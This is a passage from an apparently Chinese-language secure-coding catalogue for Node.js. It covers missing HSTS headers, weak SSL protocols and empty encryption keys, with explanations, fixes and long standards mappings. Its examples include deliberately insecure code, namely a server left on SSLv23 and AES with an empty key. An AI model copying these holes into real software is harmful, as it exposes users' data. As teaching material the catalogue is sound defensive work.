<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[43] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[44] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04) </p>
<h4 id="Insecure-Transport-HSTS-not-Set"><a href="#Insecure-Transport-HSTS-not-Set" class="headerlink" title="Insecure Transport: HSTS not Set"></a>Insecure Transport: HSTS not Set</h4><h5 id="ABSTRACT-59"><a href="#ABSTRACT-59" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序未设置 HTTP 严格传输安全 (HSTS) 头文件，这使得攻击者能够通过执行 HTTPS stripping 攻击使用普通 HTTP 连接替换 SSL/TLS 连接并窃取敏感信息。</p>
<h5 id="EXPLANATION-59"><a href="#EXPLANATION-59" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTTPS stripping 攻击是一种中间人攻击，攻击者可在所有 HTTP 流量中监视引用 HTTPS 的位置标头和链接，并使用 HTTP 版本予以替换。攻击者保留所有 HTTP 替换版本的列表，以使 HTTPS 请求返回到服务器。所有断开的 HTTP 连接通过 HTTPS 代理连接到了服务器。受害者和攻击者之间的所有流量均通过 HTTP 发送，从而暴露了用户名、密码和其他私人信息，但服务器仍然从攻击者接收预期的 HTTPS 流量，因此一切看似正常。</p>
<p>HTTP 严格传输安全 (HSTS) 是一种安全标头，它指示浏览器在标头自身指定的期间始终连接到通过 SSL/TLS 返回 HSTS 标头的站点。即使用户在浏览器 URL 栏中输入了 <a href="http://，通过" target="_blank" rel="noopener">http://，通过</a> HTTP 到服务器的连接还是将自动替换为 HTTPS 版本。</p>
<h5 id="RECOMMENDATIONS-59"><a href="#RECOMMENDATIONS-59" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>可以在 Express 应用程序中使用 Helmet 中间件，以轻松在应用程序中默认添加此标头。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">app.use(helmet());</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-58"><a href="#REFERENCES-58" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP HTTP Strict Transport Security </p>
<p>[2] Moxie Marlinspike sslstrip </p>
<p>[3] Node.js Security Checklist </p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 319 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000068, CCI-001453, CCI-002418, CCI-002420, CCI-002421, CCI-002422, CCI-002890, CCI-003123 </p>
<p>[6] Standards Mapping - FIPS200 CM, SC </p>
<p>[7] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1) </p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.9.1 Communications Architectural Requirements, 2.2.5 General Authenticator Requirements, 2.6.3 Look-up Secret Verifier Requirements, 6.2.1 Algorithms, 8.3.1 Sensitive Private Data, 8.1.6 General Data Protection, 9.1.1 Communications Security Requirements, 9.2.2 Server Communications Security Requirements, 14.4.5 HTTP Security Headers Requirements </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications </p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection </p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 4.1, Requirement 6.5.4 </p>
<p>[23] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 6.2 - Sensitive Data Protection, Control Objective 7.1 - Use of Cryptography </p>
<p>[24] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319 </p>
<p>[25] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311 </p>
<p>[26] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311 </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[44] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[45] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04) </p>
<h4 id="Insecure-Transport-Weak-SSL-Protocol"><a href="#Insecure-Transport-Weak-SSL-Protocol" class="headerlink" title="Insecure Transport: Weak SSL Protocol"></a>Insecure Transport: Weak SSL Protocol</h4><h5 id="ABSTRACT-60"><a href="#ABSTRACT-60" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>SSLv2、SSLv23 和 SSLv3 协议包含多个使它们变得不安全的缺陷，因此不应该使用它们来传输敏感数据。</p>
<h5 id="EXPLANATION-60"><a href="#EXPLANATION-60" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>传输层安全 (TLS) 协议和安全套接字层 (SSL) 协议提供了一种保护机制，可以确保在客户端和 Web 服务器之间所传输数据的真实性、保密性和完整性。TLS 和 SSL 都进行了多次修订，因此需要定期进行版本更新。每次新的修订都旨在解决以往版本中发现的安全漏洞。使用不安全版本的 TLS/SSL 将削弱数据保护力度，并可能允许攻击者危害、窃取或修改敏感信息。</p>
<p>弱版本的 TLS/SSL 可能会呈现出以下其中一个或所有属性：</p>
<ul>
<li><p>没有针对中间人攻击的保护</p>
</li>
<li><p>身份验证和加密使用相同密钥</p>
</li>
<li><p>消息身份验证控制较弱</p>
</li>
<li><p>没有针对 TCP 连接关闭的保护</p>
</li>
</ul>
<p>这些属性的存在可能会允许攻击者截取、修改或篡改敏感数据。</p>
<p>示例 1：此 Node.js 片段尝试通过安全连接创建服务器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var options = &#123;</span><br><span class="line"></span><br><span class="line">  port: 443,</span><br><span class="line"></span><br><span class="line">  path: &apos;/&apos;,</span><br><span class="line"></span><br><span class="line">  key : fs.readFileSync(&apos;my-server-key.pem&apos;),</span><br><span class="line"></span><br><span class="line">  cert : fs.readFileSync(&apos;server-cert.pem&apos;),</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https.createServer(options);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>由于 Node.js 将 secureProtocol 的默认值设置为 SSLv23_method，因此，在未专门覆盖 secureProtocol 时，服务器本身就并不安全。</p>
<h5 id="RECOMMENDATIONS-60"><a href="#RECOMMENDATIONS-60" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>强烈建议强制客户端仅使用最安全的协议。</p>
<p>示例 2：此 Node.js 代码段与Example 1 相同，只不过它会强制通过 TLSv1.2 协议进行通信：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var options = &#123;</span><br><span class="line"></span><br><span class="line">  port: 443,</span><br><span class="line"></span><br><span class="line">  path: &apos;/&apos;,</span><br><span class="line"></span><br><span class="line">  secureProtocol: &apos;TLSv1_2_method&apos;,</span><br><span class="line"></span><br><span class="line">  key : fs.readFileSync(&apos;my-server-key.pem&apos;),</span><br><span class="line"></span><br><span class="line">  cert : fs.readFileSync(&apos;server-cert.pem&apos;),</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https.createServer(options);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-59"><a href="#REFERENCES-59" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] David Wagner and Bruce Schneier Analysis of the SSL 3.0 protocol </p>
<p>[2] CVE 2014-3566 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 327 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000068, CCI-000382, CCI-001453, CCI-001941, CCI-001942, CCI-002418, CCI-002420, CCI-002421, CCI-002422, CCI-002890, CCI-003123 </p>
<p>[5] Standards Mapping - FIPS200 CM, SC </p>
<p>[6] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.9.3 Cryptographic Software and Devices Verifier Requirements, 6.2.1 Algorithms, 6.2.2 Algorithms, 8.3.7 Sensitive Private Data, 9.1.2 Communications Security Requirements, 9.1.3 Communications Security Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 4.1, Requirement 6.5.4 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.2 - Sensitive Data Protection, Control Objective 7.1 - Use of Cryptography </p>
<p>[23] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 327 </p>
<p>[24] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 327 </p>
<p>[25] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 327 </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3260.1 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3260 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3260 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3260 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3260 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3260 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3260 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001510 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[43] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04) </p>
<h4 id="Key-Management-Empty-Encryption-Key"><a href="#Key-Management-Empty-Encryption-Key" class="headerlink" title="Key Management: Empty Encryption Key"></a>Key Management: Empty Encryption Key</h4><h5 id="ABSTRACT-61"><a href="#ABSTRACT-61" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>空加密密钥可能会削弱安全性，一旦出现安全问题将无法轻易修正。</p>
<h5 id="EXPLANATION-61"><a href="#EXPLANATION-61" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用空加密密钥绝非好方法，因为这样将会大幅减弱由良好的加密算法提供的保护，而且还会使解决这一问题变得极其困难。在问题代码投入使用之后，除非对软件进行修补，否则将无法更改空加密密钥。如果受空加密密钥保护的帐户遭受入侵，系统所有者将必须在安全性和可用性之间做出选择。</p>
<p>示例 1：以下代码使用空加密密钥执行 AES 加密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var crypto = require(&apos;crypto&apos;);</span><br><span class="line"></span><br><span class="line">var encryptionKey = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">var algorithm = &apos;aes-256-ctr&apos;;</span><br><span class="line"></span><br><span class="line">var cipher = crypto.createCipher(algorithm, encryptionKey);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>不仅任何可以访问此代码的人可以确定它使用空加密密钥，而且任何具有最基本破解技术的人都更有可能成功解密所有加密数据。在应用程序发布之后，必须对软件进行修补才能更改空加密密钥。雇员可以利用手中掌握的信息访问权限入侵系统。即使攻击者只能访问应用程序的可执行文件，他们也可以提取使用了空加密密钥的证据。</p>
<h5 id="RECOMMENDATIONS-61"><a href="#RECOMMENDATIONS-61" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>加密密钥不能为空，而应对加密密钥加以模糊化，并在外部资源文件中进行管理。如果在系统中采用明文的形式存储加密密钥（空或非空），任何有足够权限的人即可读取加密密钥，还可能误用这些加密密钥。</p>
<h5 id="REFERENCES-60"><a href="#REFERENCES-60" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 321 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287, [19] CWE ID 798 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002450 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-12 Cryptographic Key Establishment and Management (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.9.1 Cryptographic Software and Devices Verifier Requirements, 2.10.2 Service Authentication Requirements, 2.10.4 Service Authentication Requirements, 3.5.2 Token-based Session Management, 3.7.1 Defenses Against Session Management Exploits, 6.2.1 Algorithms, 6.4.1 Secret Management, 6.4.2 Secret Management, 9.2.3 Server Communications Security Requirements, 10.2.3 Malicious Code Search </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M6 Broken Cryptography </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.2 - Use of Cryptography </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 259 </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3350 CAT I </p>
